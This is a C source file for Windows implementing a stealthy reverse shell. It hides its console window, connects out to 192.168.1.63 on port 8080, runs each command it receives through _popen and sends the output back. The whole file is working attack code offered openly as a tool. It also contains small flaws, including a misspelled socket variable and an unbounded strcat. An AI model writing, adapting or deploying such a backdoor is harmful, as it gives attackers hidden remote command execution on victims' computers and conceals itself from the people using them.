// Main header
#include <winsock2.h>       // Socket connection
#include <windows.h>        // Used for WinApi calls
#include <ws2tcpip.h>       // TCP-IP sockets
#include <stdio.h>

// C Input/Output
#include <string.h>

#pragma comment(lib, "Ws2_32.lib")
#define DEFAULT_BUFLEN 1024

int main() {
    HWND stealth; // Declare a window handle
    AllocConsole(); // Allocate a new console
    stealth = FindWindowA("ConsoleWindowClass", NULL); // Find the previous console window
    ShowWindow(stealth, 0); // Hide the previous console window
    RevShell();
    return 0;
}

void exec(char* returnval, int returnsize, const char *command) {
    FILE* fp;
    char buffer[DEFAULT_BUFLEN];

    if ((fp = _popen(command, "r")) == NULL) {
        snprintf(returnval, returnsize, "[x] Error executing command..\n");
        return;
    }
    while (fgets(buffer, DEFAULT_BUFLEN, fp) != NULL) {
        strcat(returnval, buffer);
    }
    _pclose(fp);
}

void RevShell() {
    WSADATA wsaver;
    WSAStartup(MAKEWORD(2, 2), &wsaver);

    SOCKET tcpsock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

    sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr("192.168.1.63"); // target IP address
    addr.sin_port = htons(8080); // Set the port number

    if (connect(tcpsock, (SOCKADDR*)&addr, sizeof(addr)) == SOCKET_ERROR) {
        closesocket(tcpstock);
        WSACleanup();
        exit(0);
    } else {
        char CommandRecieved[DEFAULT_BUFLEN] = "";
        while (true) {
            int Result = recv(tcpsock, CommandRecieved, DEFAULT_BUFLEN, 0);
            if (Result <= 0) {
                break;
            }
            CommandRecieved[Result] = '\0';

            char buffer[DEFAULT_BUFLEN] = "";
            exec(buffer, sizeof(buffer), CommandRecieved);
            send(tcpsock, buffer, strlen(buffer), 0);
            memset(CommandRecieved, 0, sizeof(CommandRecieved));
        }
    }
    closesocket(tcpsock);
    WSACleanup();
    exit(0);
}